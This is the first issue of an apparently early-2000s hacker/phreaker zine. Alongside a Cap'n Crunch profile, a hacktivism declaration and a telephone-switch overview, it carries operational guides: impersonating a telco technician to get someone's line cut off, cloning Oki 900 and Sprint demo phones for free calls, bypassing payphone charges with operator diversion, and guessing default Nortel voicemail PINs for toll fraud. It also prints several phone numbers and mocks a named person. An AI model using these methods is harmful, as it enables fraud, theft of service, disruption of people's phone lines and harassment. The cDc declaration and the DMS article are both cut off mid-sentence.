=========================[     Hello World     ]=========================



Its here, the first issue of HackerÆs Digest, sixty pages of kung fuck 
that you would be stupid not to read. You might be asking yourself just 
what the hell we are trying to do. Our goal is to provide solid 
information to the hacker/phreaker community. Hackers you say? Those punk 
kids who billed $5,000 dollars to my credit card? Fuck no... We are not 
here to defend, support or encourage petty crimes that are done with 
computers. We are about cutting edge technology, how technology works, 
its faults, and how it effects our life. We are about learning and answering 
questions that you canÆt ask anywhere else. 

Now that you know what we are about let me explain how we are operate. 
We offer one year subscriptions for $15.00 and a two year subscription for 
$30.00. We also have the magazine online for free. Why do we sell and 
offer the magazine for free? We need the support. HackerÆs Digest operates 
off of a shoe string budget and we need your support to keep us running. 

There are other ways to support HackerÆs Digest. We need letters, articles, 
and comments to tell us what you want to see in HackerÆs Digest. Everything 
you send to us will be read, so send it in. The fact is that we need to 
know that you are out there and we are going to keep putting issues out 
and paying the bills as long as we know people are out there giving a damn 
about what we are doing. 

So how important is it to have a magazine that supports freedom of speech? 
With new laws being passed such as the Digital Millennium Copy Write Act, 
cameras in the streets scanning everyone's face to a database that is made 
up of data that gets populated from the DMV. More worms being released into 
the wild, feeding the fire about "Cyber Terrorism" You tell me. 

You will not see banners or paid advertisements of any sort on our web site 
or in our magazine. We are not about making money. We are about providing 
to the hacking/phreaking community that has provided so much to us. To 
educate our peers who have educated us. 

You will notice that this issue does not have any letters in it. Well its 
our first issue so what do you expect. In the future we will offer ten pages 
of letters so send them in. There is little chance it will not get printed.
We are also excepting any type of art you could send in. Drawings, logos, 
and covers. As well as ideas for any covers you might have. Anything will 
help. 

We could have not gotten this together in time without support from alot 
of friends. Special thanks to PPC (www.ppchq.org) and Phone Geeks 
(www.phonegeeks.com). All of our writers and everyone who helped to make 
this happen.



===========[     Hacker's Digest Focus Cap 'n Crunch     ]===============



Who is Cap æn Crunch 

Cap æn Crunch has to be one of the most well known phone phreaks to go down 
in history. You may have came across his name in a text file or heard him 
speak at H2K in the Old Timers panel. According to Cap æn Crunch his first 
adventure into phone phreaking came when he received a call from a blind kid
who had heard him on the radio from a home made transmitter. He asked the 
kid for his phone number and he called him back, to his surprise it was a 
loop. 

He visited the blind kid at his house and he wanted to know if Cap æn Crunch 
could build him a MFÆer which is a box that plays 6 tones, 700, 900, 1100, 
1300, 1500, and 1700 Hz. This is widely known as a blue box. The kid called 
a 800 number and then seized a trunk with his organ.

Calling a conference line that could only be accessed if you owned a blue box
Cap æn Crunch would talk hours on end about the phone system with other phone 
phreaks. If they found a problem in the phone system such as a sick trunk they 
would call the phone company and report the problem. They would get responses 
such as "WeÆve been trying to trace down that stuck tandem for months, how did 
you find it?". They even had the phone company thinking they worked for them. 

Cap æn CrunchÆs Arrest 

In 1971 there was a article in the San Jose Mercury about a guy selling blue 
boxes to members of organized crime. The phone company then tapped the 
conference line and soon the guy was arrested. To get back at the phone company 
he got in touch with Ron Rosenbaum who wrote the article "The Secret of the 
little blue box" that is easily to find this day on the internet. Ron Rosenbaum 
got in touch with the blind kid for interviews. With out knowing that Cap æn 
Crunch did not want to have anything to do with Ron Rosenbaum the blind kid 
told him everything. Cap æn Crunch ran to a news stand and was shocked at all 
the errors in the article. He just knew the FBI was going to come for him so 
he completely stopped everything.

In 1972 Cap æn Crunch stopped at a 7-11, as soon as he got out of his car he 
was jumped by 4 men who threw him against the car, handcuffed him and read 
him his rights. 

Serving Time 

Cap æn Crunch served his time at Lompoc minimum security prison. He bought a 
radio and modified it to pick up the prison guards walkie talkieÆs. He would 
have a friend wait for him on a loop and would three way other people from 
there. In jail he showed other inmates how to build cheese boxes. He said it 
was a challenge to teach people who could hardly read or write how to build 
things such as laser bug detectors etc... Cap æn Crunch volunteered to work 
in the pig stables. He said that since he grew up on a farm and really liked 
animals he did not mind the labor. By teaching other inmates, it was a way to 
keep his mind occupied and make time go a little faster. It also helped his 
popularity and kept him from having to do the shittiest jobs.

Cap æn Crunch and Apple

If you decide to visit Cap æn Crunches web site you will see his support for
apple for being a secure operating system, but his roots with apple go further
then that. After the article "The Secret of the little blue box" came out, Steve
Wozniak, co founder of Apple Computers wanted to contact him. Steve Wozniak
contacted Cap æn Crunch and it was not long before he talked him into visiting
UC Berkeley. When he went to Steve WozniakÆs dorm, he also found Steve Jobs and
Bill Klaxton waiting for him. He explained how to use it and better what not to
do with it. He told Steve Wozniak not to sell blue boxes but he did not listen
and made enough money to pay for school and finance the Apple I project.

Cap æn CrunchÆs Second Arrest

Yes, Cap æn Crunch was arrested a second time. He was friends with great social
engineering artist named Adam. Adam contacted Cap æn Crunch and talked him into
visiting him. He had broken into COSMOS. This was the phone companyÆs computer
system and had the power to do anything. Adam visited him a few more times.  Cap
æn Crunch would take him to PotLuck dinn- ers hosted by peopleÆs Computer
Company. When he was at a food market Adam had flagged him down to a pay phone
and put it in his face to talk to a friend not knowing how the call was paid. 
In 1974 Cap æn Crunch was arrested again. Come to find out, Adam had sold him
out to the FBI and had a pay phone tapped so it was like he blue boxed the call.
He also found out that Adam got a few other people busted that would not have
got back into blue boxing if Adam did not contact them.

Pranking the President

Cap æn Crunch found a way to listen to on going conversations the same way the
operator can break into a call if its a emergency y. Cap æn Crunch was scanning
the 202 area code which was for the Washington area. They found the CIA Crisis
hot line. They tapped the number and heard people talking they were sure was
CIA.  They soon found the code word that would connect them to the president.
They called up and heard someone say "9337" Cap æn Crunch's friend said "Olympus
please!", the man at the other end said "One moment sir!" sure enough a man that
sounded alot like Nixon said "WhatÆs going on?". his friend said "We have a
crisis here in Los Angeles!", Nixon said "WhatÆs the nature of the crisis?", his
friend said in a serious tone of voice "WeÆre out of toilet paper sir!". Nixon
said "WHO IS THIS?" his friend hung up. No one knows what happened to the tapes.

Cap æn Crunch Now

Cap æn Crunch is currently working on his own business, web hosting and his new
firewall Intrusion Detection System called the "Crunch Box" that is built on
OpenBSD.  His web hosting service has to be the most secure servers I have ever
seen. His whole network is running Mac OS and we all know how many security
holes there are for the Mac.

I asked him what he thought about phone phreaking groups such as Phone Losers of
America and he thought they were great. He also said they contacted him and
asked if he would link to there site. He checked it out and thought they were
worth the link. I also asked him, if given the chance would he do it all again.
He told me without a doubt.

Cap æn Crunch honestly had to be one of the nicest phone phreaks I have ever
met.  Its clear that all the hype his name has is well deserved and has not even
gone remotely close to his head and if you have a chance to email him I would. 
He has to be the most interesting person I have ever met.

=====================[    The New AT&T Network     ]=====================
=====================[        by Lucky225          ]=====================


It seems that AT&T was not to fond of my ANI Spoofing article that appeared in
2600 (17:4) Just a few days after I picked up a copy of the new 2600 and saw
that my article had been printed, I started noticing a lot of changes in the
AT&T network. First they shut off their 800 ANAC, a few days later calls that
were routed to 800-673-7286 by the Verizon Long Distance operator were handled
strangely. I began noticing that if I made a call through the Verizon Long
Distance operator to 800-673-7286, I could place calls to 800 numbers NOT on the
AT&T network, but that the ANI was being sent as '615-986-9873' or ANI II Pair
23 followed by areacode 904. Thus, calls placed through the Verizon Long
Distance operator to AT&T's 800-operator could not be used to spoof ANI any
more. The 615 number belongs to a PBX owned by AT&T in Nashville, TN. I could
still spoof ANI on the AT&T network if I diverted through my local operator or
various other 101XXX long distance carrier operators, but this April it stopped
working. I soon figured out what was happening. AT&T has centers all around the
country including Alaska and Hawaii.  The way SS7 works, depending on where your
calling from, an 800 number can be routed to various other places. For example
their could be a nationwide 800 number that alows you to call from any where in
the country, but say a person that calls the same 800 number from Florida could
get routed to that business's office on the east coast, and a person that calls
from California may get routed to the west coast office. That's what it's like
when you call 800-673-7286, you get routed to the nearest AT&T center near you
to take the call. So when I was making a call through the Verizon Long Distance
operator to 800 673 7286 I would get routed to the Florida AT&T center because
the Verizon Long Distance operator I got was based out of Florida(813), which is
why when I had the AT&T operator dial an ANAC it would show 23-904(Florida).
However, not all Verizon Long Distance operators are based in Florida, some of
them are based out of Kentucky(606) which for whatever reason will get you the
Nashville, TN Center. The Nashville Center is the only center I have seen so far
that transmits ANI with ANI II Pair "00" and a full 10 digit phone
number(615-986-9873)

The AT&T Centers: As I mentioned, there are various AT&T centers throughout the
country, and they are also the centers that handle the automated AT&T Long
Distance operator services as well as 800-call-att and 800-operator. With the
new upgrade that AT&T is implementing (wide spread across the country I preditct
by now) each center is geting a total make over, there will be no more ANI
spoofing to AT&T numbers, they are updating these centers so that you can call
any 800 number through the AT&T carrier. Calls to 800 673 7286 that have an ANI
fail will no longer use the phone number you give as ANI when calling other toll
free numbers. Instead, ANI II pair 23 and the areacode of the AT&T center will
be used. However, the best part is that you can place calls to toll free numbers
without speaking to an operator. Simply dial 10-10-ATT-0(10-10-288-0) and enter
the toll free number you want to call. The ANI will show up as ANI II pair 23
and the areacode of the AT&T Center, op diverting without even having to speak
to the op! However you will notice that if you try to dial 800-call-att or
800-673-7286 it will apear that your ANI still shows up, this is because these
numbers are handled by the same AT&T center. However any toll-free number not
handled by the AT&T center(basically any toll-free number that's not used for
AT&T operator services) will be processed with your ANI not being transmited. 
There are a few advantages and disadvantages of this new system. The only real
disadvantage is that you can not spoof ANI any more. The advantages however are
that you can place calls to basically any toll free number you wish without your
ANI being passed simply by dialing 10-10-ATT-0 and then pressing in the toll
free number you want to call at the AT&T prompt. You can even use this at
payphones to call toll free numbers that don't allow payphone calls or to get
around payphone surcharges. Op diverting used to be so hard, local ops not
wanting to help you out, and 101XXX carrier ops only being able to be reached
from certain parts of the country, and the real downside being that you had to
talk to an operator, that by the way might listen in to your call, when trying
to divert to toll free numbers, but now thanks to AT&T's new network that you
can reach anywhere in the country by simply dialing 10-10-288-0 or even just 00
if you have AT&T, and you dont even have to talk to an operator you just punch
in the toll free number you want to call on your touch tone keypad. You can even
divert to that toll-free number using your modem to find out what that carrier
is you always wanted to know is by setting your modem to dial 10-10-288-0,
1-800-xxx-xxxx, without fear of your ANI showing up. I'm sure AT&T logs your ANI
and probably would take action if you were harassing a toll-free number long
enough, but for now you can think of 10-10-288-0 as your own free ANI blocking
service.

Refrence:This is a follow up to an article in 2600 17:4 titled "Confusing ANI
and Other Phone Tricks"



=====================[  The Art of the Force Out   ]=====================
=====================[            by herf          ]=====================



You may have read texts on social engineering cheeseburgers from McDonalds but
that is not what this paper is about. I will go into getting a circuit busied
out using your telco's dumbass repair techs.

I'm sure your question has shifted to how? It's actually pretty simple.

Ok, I'll go over having a person's line busied out.

Before accomplishing this, you'll need to understand what having a circuit
busied out means. When out on a job, field technicians have to get a ciccuit
disconnected for a short period of time before working on the line. Why? 
Because 110 volts of electricity surges through the circuit when phones ring. 
Bascially, if you were holding both tip and ring and the circuit tried to
connect a call, you'd be unpleasently shocked out of your mind. So, to avoid
lawsuits from their field techs, telco tech support enables circuits to be
remotely severed.

Now, you'll need to make an identity for yourself. As for myself, I most
commonly refer to myself as Chris Knight and use an employee ID I found in Bell
Atlantic's trash. I have a fake voices I use to connect personally with whatever
repair tech I talk to. If it's a black man or woman, I speak using a black man's
accent with a touch of Southern. If it's a white man or woman, I speak like a
redneck. The reason I do this is to fool the repair tech into thinking I'm
beneath them, into thikning that my intellectual capacity is that of a carrot.
Why? Because if they think their time is more important then mine, they'll
become impatient and do whatever I want them to.

The engineering aspects of having someone's circuit busied out are pretty
mindless. Get your telco's field tech support number, for one. Social
engineering it out of the CO is pretty easy. All you have to do is ask to speak
with a supervisor, tell him you're out on a ticket, you're new and the presets
on your set aren't working correctly. If he asks where your reference sheet is,
tell him it's buried underneath your equipment somewhere. If he still resists,
tell him you're already in overtime and you need to get in touch with field tech
support before working on the line. When he hears the term "Overtime" he'll
oblige because he's a nazi.

Ok, make sure to op divert to the field tech support toll free number because
you don't want to go to jail. Once connected, enter in whatever menu number it
is to speak with a repair technician. When the repair tech gives the cute little
welcome schpiel, ask their name again to show you care. When you speak, make
sure you sound like a disgruntled employee to relate with them. Announce your
name and ID number. If you don't have one, they're usually 3 digits. Just make
one up. If they say it's not listed, tell them you just got out of training.
Anyway, open the conversation like this: "Hey, what's your name again? - Oh, ok.
Well (blank), I'm out on a trouble ticket and I need to get a circuit forced
out." - They'll ask why you haven't called your CO to get it done. That's when
you say, "Well, I tried calling my CO but the line has been busy for 30 minutes.
Same with the WMC. I'm already on overtime and my foremer(foreman) doesn't like
that so I took desperate measures. Can you help me out or transfer me to someone
who can, please?"

When they say yes, you're in. It's only a matter of sounding authenticate. If
you can't sound authenticate, you probably shouldn't be doing this anyway.

Ok, so now you know and knowing is the first step to serious jail time.

Oh, below, I'll list some acronyms that might help to authenticate yourself.

WMC - Work Maintenence Center (Verizon+) WAC - Work Assessment Center
(Bellsouth- Appended by khecka) NOC - Network Operations Center IR - Tech ID
Trouble Ticket - Issued to field technicians to identify different jobs. 
Former(Foreman) - Boss SISSYTECH - Slang for a technician who only does house
repair..  Force Out - Busy Out

Peace and Fleece. One step closer to having your sheep ID revoked.



==============[OKI 900 Reprogramming/Cloning in a Nutshell]==============
==============[             by dark_fairytale             ]==============



Ok, so you've read the Oki 900 Guide by Iceberg and you still don't fully
understand how to reprogram/clone your Oki 900. Well now i'm going to explain in
the simplest terms possible on just how to do just that for those of you that
still don't understand.

Materials Needed:

Oki 900 with 4712 Chip Modification A Valid Esn and Nam Pair (ESN should already
be in hex)

Ok, now if you don't know what a Esn and Nam pair is then you shouldn't be
reading this. However, if you do, continue on. The very first thing you'll need
to do is to put your Oki 900 into test mode/debug mode by doing the following:
Power up the phone. Hold down the 7 and 9 buttons for about a second, release.
Quickly enter Menu, Snd, End, Rcl, Sto, Clr. The phone should now read Good
timing!!! If not, start over. If all goes well up until here hit 1 and 3 buttons
at the same time and it will clear the Good timing from the display. Ok, now
you're ready to program in your ESN. You have 5 locations for ESN is you are
using the 4712 chip mod and you will have to program in each byte of ESN
separately in it's separate location in order for it to work. To begin
programming the ESN into the phone: hit #54 followed by the 4 digit location
followed by the byte of ESN then Snd

Every ESN location is as follows:

-Esn 1 Locale- BE8E BE8F BE90 BE91

-Esn 2 Locale- BE93 BE94 BE95 BE96

-Esn 3 Locale- BE98 BE99 BE9A BE9B

-Esn 4 Locale- BE9D BE9E BE9F BEA0

-Esn 5 Locale- BEA2 BEA3 BEA4 BEA5

Now you may be looking at this and still wondering, what the fuck? Ok, let me
explain more clearly here. An ESN is an 8 digit/letter number combination when
properly put into hex mode which will be needed when reprogramming the ESN. When
reprogramming the ESN you will enter it two digits/letters at time into the Oki.
For example, let's say your ESN is: BD94-A623 and you want to program that into
ESN Slot 1. Therefore you would program: BD into location BE8E, 94 into BE8F,
and so on.... Ok, I hope that helps a little for you beginners. When
reprogramming your ESN more than likely you will have to program in a letter. To
get letters all you simply need to do is hit the * key on the phone before
hitting the corresponding number. Here is a key for that as well:

STAR KEY A=*1 B=*2 C=*3 D=*4 E=*5 F=*6

On last quick note on reprogramming the ESN, hit # before each entry and send to
save it before you move on. Ok,now after you get the full ESN programmed in you
will have to reboot the phone. So simply turn the phone off for a second or two
and turn it back on. Now comes reprogramming the NAM. As soon as you power up
the phone you will have to: Hold Rcl and Mnu at the same time for a second or
two, release. Quickly followed by *,6,2,7,2,9,8,5,4,#. If entered correctly some
numbers will pop up on the display followed by the words Dealer which means just
that, you are in Dealer mode and your NAM is ready to be reprogrammed. Ok, now
use the volume button on the side to scroll down to the corresponding NAM to the
ESN you just programmed in.  Let the display sit there for a second and the
prompt will then come up Own #. Now re-enter the NAM that you have for your ESN
and hit STO. With that being done hit the Down Volume button three times and you
should see a prompt that reads ACCOLC #. Here you need to enter 0 followed by
the last digit of the NAM you are programming in and hit STO once more. Once
that is done shut the phone off once more to reboot and power it back on. Now
you are ready to select your NAM and ESN from the Admin Menu to put it to use.
When the phone powers back up hit Menu 8 times for the Admin Menu to appear. Hit
recall to access it and enter your security code. The default password on most
phones is 123456, but please note that it can be changed. Once into the Admin
menu hit RCL to choose the NAM you want to use and hit STO and the prompt should
appear: RESET TIMER. Turn the phone off and turn it back on and you're almost
done. Now getting the ESN and NAM to work properly may take some experimenting
with the carrier selection which varies from A to B. Most A side carriers are
hard to clone do to rf fingerprinting. To access the carrier selection again hit
Menu 8 times and go into the Admin menu. Enter your password and hit the Down
volume arrow button until you see the System Prefer followed by whichever
carrier is selected. Hit STO to select. Try your pair with A, if that doesn't
work simply go back and Try with B. If that doesn't work, than you have a bad
pair and should go out and get another. Ok, I hope this text file has helped
those who have had trouble understanding the concept of reprogramming/cloning
the OKI 900 with 4712 MOD and if it hasn't then i strongly suggest you find a
new hobby. Thanks for reading.

=====================[     Exploring Sprint PCS    ]=====================
=====================[           by Okiwan         ]=====================



Introduction Here's a sweet exploit I came up with while waiting in line at the
Sprint PCS store. First a little back story, Sprint PCS is a digital CDMA
network making it virtually impossible to clone...or so we thought. The weakness
of Sprint's network is that there digital coverage is pathetic. To fill up the
HUGE holes in their network, Sprint has roaming agreements throughout the US.
The roaming agreement is that whenever there isn't a digital signal (1900) the
phones will drop to analog (800) which is what Sprint calls "roaming".

THE EXPLOIT Every Sprint PCS store has a sales floor where they have activated
phones that you can pick up and use. Sprintstores do that so you can try out
their phones to hear the sound quality of each different phone before you buy
one or to call home(or anyone) as a courtesy call. In fact, every time I go to a
Sprint store I always make at least 15-20 prank calls all over the US.

Basically all you need to do is:  1)Go through the menu and look for the phone's
telephone number which is your MIN (mobile id number) 2)Look at the back of the
phone and find an 8 character number/letter sequence and this is your ESN.
3)Program the ESN and MIN into your analog OKI-900 phone.

Guess what you just cloned the Sprint PCS's courtesy phone. So when you use your
cloned OKI-900 phone, Sprint PCS will think your roaming since your using an
analog only phone.

These phones are activated using unlimited calling minutes and I doubt that the
Sprint PCS store looks though the hundreds off phones calls that are made from
these phones each month so there's little to no chance of getting caught. 
There's like 7-8 different models out right now so you should get all 7-8
accounts and use'em like crazy.


=====================[   Exploring MTV Telecom     ]=====================
=====================[     by dark_fairytale       ]=====================



MTV. You all know the name. You've all probably watched it at one time or
another. Who hasn't? One day this past spring , I happened to be watching MTV.
In fact it was an episode of Total Request Live. If you haven't seen this (which
most of you probably have) show, I'll cover the premise briefly.  Carson Daly
hosts this live daily show from MTV Studios in New York, NY, which basically
caters to the teeny bopper fad of boy bands and Britney Spears.  Every once in a
brief while you might actually see a real band in a video, but very rarely. Go
figure. Anyways, I'm sitting there watching this show, TRL, when they say
they're gonna have a contest. WOWIE! A contest that will go something like this:
In every top 10 video there will be a hint/clue/question asked and the answer is
a number. When all the numbers are revealed, you will have the phone number for
the TRL Studio Phone which is no more than ten feet away from Carson Daly's fat
head.

Now normally, I wouldn't be impressed with their cheesy contests, but this one
somehow piqued my interest. Imagine having the number to that phone to disrupt
their live show day after day to constantly harass Carson Daly. Oh what fun that
would be! Eh! I had to have this number. So I raced for a pen and paper and sat
through the whole damn show jotting down number after number.  But, before the
show had ended, I had remembered someone mentioning to me before that MTV/Viacom
had it's very own exchange in New York. Why would such a company have it's very
own exchange, is beyond my comprehension, but tis true.  The Viacom exchange is
212 846. I had these first six numbers, because I already had a number within
MTV studios that i knew was legit.

So on with the contest with my cheating going on already. Well turns out, MTV
decided to give everyone a chance to win the contest earlier than expected by
having the number 2 video question be, "how many times is rollin said in the
following video Limp Bizkit's Rollin?" equal out to the last 2 digits of the
phone number. Up to this point, I had all the numbers correct. But somehow the
light gleaming off of Fred Durst's bald head threw me off and I got confused and
blew that. Foiled again! After someone rang the phone next to Carson Daly, they
scrolled the number by on the screen for the phone and I quickly jotted it down.
I raced for the phone to give Carson Daly a call.

I quickly dialed 212 846 5581. The phone rings a couple times and a woman
answers. S o I say, "Hello." She says, "Who is this?" so i reply with, "Uhhhhh,
who is this??" She then proceeds to yell at me and say, "THEY MESSED UP! QUIT
CALLING! THEY GAVE OUT THE WRONG NUMBER ON THE AIR!" and slams the phone down.

What? MTV messed up and gave out one of their MTV employees phone numbers
instead?  Apparently so, since I obviously wasn't the first confused person this
woman had talked to and she was obviously ticked off about the whole ordeal, but
someone had rang the MTV phone to claim their prize. So was it just a mix up on
the winner's behalf? Was the whole contest rigged? I'm still not sure to tell
you the truth, and I don't really care, but this is what started my mission.

My mission really had no climax or finality to it. I was just determined to come
up with some interesting phone numbers in the MTV/Viacom system by demon dialing
the exchange. I also made it a real point to come up with that "secret" MTV TRL
phone number so i could talk to Carson during the show.

Anyways after hours of dialing and dialing I finally realized that MTV had a ton
of people working for them I never heard of. Useless people that probably no one
in the world had even heard of to tell you the truth. I also discovered that MTV
uses a Nortel Meridian system for it's telephony needs. We all know just how fun
these can be to play with. If you don't know what I'm talking about, let me
explain. Nortel manufactures these wonderous devices which are installed with
default, usually 4 number, pins. What that means is the pin for a 4 digit
mailbox will match the login if it isn't changed by the owner. You can usually
crack into these babies within ten minutes using random guessing at numbers and
a little common sense. Did I also fail to mention that some Meridians are
equipped with outdialing features? I think you know what I'm getting at. One
could easily rack of tons of toll fraud on MTV's behalf if they really wanted to
and with what i'm sure is a multi-million dollar network, they would probably
never even notice.

Anyways, back to the story. I'm dialing around and dialing around when I finally
realize this is completely useless. The chances of me finding anyone famous'
number is a long shot at the rate I'm going. So what do I do? I give up.

What does it matter? I already have Serena Altschul's MTV number and it's not
that hard to run across on the internet if you know the right people. I've
talked to her on a couple occassions and may I say, she is not the most
courteous person on the telephone. Serena, if you're reading this, I don't like
you. Just thought I would say that.

So what I have learned here? I've learned that MTV does in fact have their own
exchange in New York, to reasons unknown to me. MTV's telephone network operates
off a Nortel Meridian System. MTV pays a lot of useless people to sit around all
day, and I have a few interesting numbers. So I have this text file now of names
and numbers at MTV Viacom and I've narrowed the numbers down to what I think may
be the TRL phone. My guess is: 212 846 5781, (which usually rings and rings. Did
they turn the ringer off? Rats, foiled again.)but I'm pretty sure they could
change the thing if they really wanted which is a total letdown nonetheless.
Failure, curiosity, and sore fingers. It's all in days' work for this common
phreak.


=================[INTERNATIONAL BOOKBURNING IN PROGRESS]==================
=================[       by Cult of the Dead Cow       ]==================



Free speech is under siege at the margins of the Internet. Quite a few countries
are censoring access to the Web through DNS [Domain Name Service] filtering.
This is a process whereby politically incorrect information is blocked by domain
address -- the name that appears before the dot com suffix.  Others employ
filtering which denies politically or socially challenging subject matter based
on its content.

Hacktivismo and the CULT OF THE DEAD COW have decided that enough is too much. 
We are hackers and free speech advocates, and we are developing technologies to
challenge state-sponsored censorship of the Internet.

Most countries use intimidation and filtering of one, kind or another including
the Peoples Republic of China, Cuba, and many Islamic countries. Most claim to
be blocking pornographic content. But the real reason is to prevent challenging
content from spreading through repressive regimes. This includes information
ranging from political opinion, "foreign" news, women's issues, academic and
scholarly works, religious information, information regarding ethnic groups in
disfavor, news of human rights abuses, documents which present drugs in a
positive light, and gay and lesbian content, among others.

The capriciousness of state-sanctioned censorship is wide-ranging. [1]

* In Zambia, the government has attempted to censor information revealing their
plans for constitutional referendums.

* In Mauritania -- as in most countries --, owners of cybercafes are required to
supply government intelligence agents with copies of e-mail sent or received at
their establishments.

* Even less draconian governments, like Malaysia, have threatened web-publishers
for violating their publishing licenses by publishing frequent updates: _timely,
relevant_ information is seen as a threat.

* South Korean's national security law forbids South Koreans from having any
contact -- including contact over the Internet -- with their North Korean
neighbors.

* Sri Lanka threatened news sites with possible revocation of their licenses if
coverage of a presidential election campaign was not partial to the party of the
outgoing president.

The risks of accessing or disseminating information are often great.

* In Ukraine, a decapitated body found near the village of Tarachtcha is
believed to be that of Georgiy Gongadze, founder and editor of an on-line
newspaper critical of the authorities.

* In August, 1998, eighteen year old Turk Emre Ersoz was found guilty of
"insulting the national police" in an Internet forum after participating in a
demonstration that was violently suppressed by the police. His ISP provided the
authorities with his address.

* Journalist Miroslav Filipovic has the dubious distinction of having been the
first Journalist accused of spying because of articles published on the Internet
-- in this case detailing the abuses of certain Yugoslav army units in Kosovo.

We are sickened by these egregious violations of information and human rights.
The liberal democracies have talked a far better game than they've played on
access to information. But hackers are not willing to watch the custodians of
the International Convention on Civil and Political Rights and the Universal
Declaration of Human Rights turn them into a mockery. We are willing to put our
money where our mouth is.

Hacktivismo and the CULT OF THE DEAD COW are issuing the HACKTIVISMO DECLARATION
as a declaration of outrage and a statement of intent. It is our Magna Carta for
information rights. People have a right to reasonable access of otherwise
lawfully published information. If our leaders aren't prepared to defend the
Internet, we are.

DEEPLY ALARMED that state-sponsored censorship of the Internet is rapidly
spreading with the assistance of transnational corporations,

TAKING AS A BASIS the principles and purposes enshrined in Article 19 of the
Universal Declaration of Human Rights (UDHR) that states, _Everyone has the
right to freedom of opinion and expression; this right includes freedom to hold
opinions without interference and to seek, receive and impart information and
ideas through any media and regardless of frontiers_, and Article 19 of the
International Covenant on Civil and Political Rights (ICCPR) that says,

1. Everyone shall have the right to hold opinions without interference.

2. Everyone shall have the right to freedom of expression; this right shall
include freedom to seek, receive and impart information and ideas of all kinds,
regardless of frontiers, either orally, in writing or in print, in the form of
art, or through any other media of his choice.

3. The exercise of the rights provided for in paragraph 2 of this article
carries with it special duties and responsibilities. It may therefore be subject
to certain restrictions, but these shall only be such as are provided by law and
are necessary:

(a) For respect of the rights or reputations of others;

(b) For the protection of national security or of public order, or of public
health or morals.

RECALLING that some member states of the United Nations have signed the ICCPR,
or have ratified it in such a way as to prevent their citizens from using it in
courts of law,

CONSIDERING that, such member states continue to willfully suppress wide-ranging
access to lawfully published information on the Internet, despite the clear
language of the ICCPR that freedom of expression exists in all media,

TAKING NOTE that transnational corporations continue to sell information
technologies to the world's most repressive regimes knowing full well that they
will be used to track and control an already harried citizenry,

TAKING INTO ACCOUNT that the Internet is fast becoming a method of repression
rather than an instrument of liberation,

BEARING IN MIND that in some countries it is a crime to demand the right to
access lawfully published information, and of other basic human rights,

RECALLING that member states of the United Nations have failed to press the
world's most egregious information rights violators to a higher standard,

MINDFUL that denying access to information could lead to spiritual,
intellectual, and economic decline, the promotion of xenophobia and
destabilization of international order,

CONCERNED that governments and transnationals are colluding to maintain the
status quo,

DEEPLY ALARMED that world leaders have failed to address information rights
issues directly and without equivocation,

RECOGNIZING the importance to fight against human rights abuses with respect to
reasonable access to information on the Internet,

THEREFORE WE ARE CONVINCED that the international hacking community has a moral
imperative to act, and we

DECLARE:

* THAT FULL RESPECT FOR HUMAN RIGHTS AND FUNDAMENTAL FREEDOMS INCLUDES THE
LIBERTY OF FAIR AND REASONABLE ACCESS TO INFORMATION, WHETHER BY SHORTWAVE

* THAT WE RECOGNIZE THE RIGHT OF GOVERNMENTS TO FORBID THE PUBLICATION OF
PROPERLY CATEGORIZED STATE SECRETS, CHILD PORNOGRAPHY, AND MATTERS RELATED TO
PERSONAL PRIVACY AND PRIVILEDGE, AMONG OTHER ACCEPTED RESTRICTIONS. BUT WE
OPPOSE THE USE OF STATE POWER TO CONTROL ACCESS TO THE WORKS OF CRITICS,

=====================[ Digital Multiplexing System ]=====================
=====================[          by Janus           ]=====================



This article will attempt to explain the DMS (Digital Multiplexing System).
Think of this file as more of a compilation of the material I have read, rather
than something I authored completely from scratch. Special thanks to Control-C
for most of the information found here.

-DMS

DMS was/is made by Northern Telecom. It was first introduced in 1979. To date,
DMS has been able to interface with such switches as ESS #1-4, Xbar, TSPS, and
EAX. The DMS switch itself is physically smaller than a Xbar switch, and usually
smaller than most AXE switches. This is because the DMS switch is more spread
out, as opposed to other types of switches which are all located in one switch
house. The use of remote modules give the CO more space to install a Line
Concentrating Module (LCM) or Main Distribution Frame (MDF). Many versions of
DMS exist. DMS versions and systems are as follows:

1) DMS-10 - a C5 switch which can be used with up to 10,800 lines. Designed for
rural areas and large businesses. Almost always connected with a larger DMS-100
or -100/200 switch.

2) DMS-100 - a C5 local office able to be used with 1,000 to 100,000 lines. Very
widely used today to handle residential areas' phone lines. A DMS-100 local
office can also be adapted to Equal Access End Office (EAEO)

3) DMS-200 - can be used with up to 60,000 trunks. Can also serve a AT (Access
Tandem) function. The Auxiliary Operator Services System (AOSS) is a part of
DMS-200 that controls Operater-assisted calls, such as Directory Assistance.
AOSS is made possible by Traffic Operator Position System (TOPS) and Operator
Centralization (OC). These 2 functions allow transfer operator services from
other DMS-200 toll centers.

4) DMS 100/200 - Uses functions such as the toll and local systems mentioned
above, but also includes the EAEO/AT combination. Can handle either 100,000
lines or 60,000 trunks.  Used instead of using -100 and -200 seperately.

5) DMS-250 - Not very widely used. Used in association with specialized common
carriers that need tandem switching.

6) DMS-300 - Designed for international use. The number of DMS-300 switches that
are used is in the single digits.

7) Remote Switching Center (RSC) - Used instead of DMS-100, it has the ability
to switch up to 5,760 lines.

8) Remote Line Concentrating Module (RLCM) - Able to switch up to 640 lines. Can
be used with RSC or DMS-100 with assistance from the Line Concentrator Module
(LCM).

9) Outside Plant Module (OPM) - Able to switch up to 640 lines. Can also be used
in association with RSC or DMS-100.

10) Subscriber Carrier Module (SCM or SCM-100) -

-a) Subscriber Carrier Module (Rural (SCM-100R)) - Eliminates the CO Central
Control Terminal (CCT) by being integrated with a DMS-100 switch.

-b) Subscriber Carrier Module SLC-96 (SCM-100S) - gives a direct link between
DMS-100 and SLC-96 loop carriers.

-c) Subscriber Carrier Module Urban (SCM-100U) - Used to interact with DMS-1
Urban (DMS version specialized for use in urban areas.)

11) DMS-Mobile Telephone Exhange (DMS-MTX) - A special type of DMS-100 that is
used with Cellular switching. It can serve up to 50,000 people in up to 50
cells.

12) Supernode -a) DMS-Supernode - Revision of the DMS-100 that supports faster
processing.

-b) DMS-Supernode SE - same as above, except in a reduced physical size, and
uses the Link Peripheral Processor (LPP).

Important Features of DMS-100:

1) Automatic Route Selection - automatically detects the best trunk for routing
toll and LD calls.

2) Station Message Detail Recording - an enhanced call logging system,keeps
track of times, dates, duration, etc.

3) Direct Inward System Access (DISA) - allows maintenance and administration
from remote terminals.

Operator Features included with DMS-200 and -100/200:

1) Traffic Operator Position System (TOPS) - gives certain functions to handle
incoming and outgoing calls.

2) Operator Centralization (OC) - Lets an operator interface with the switch
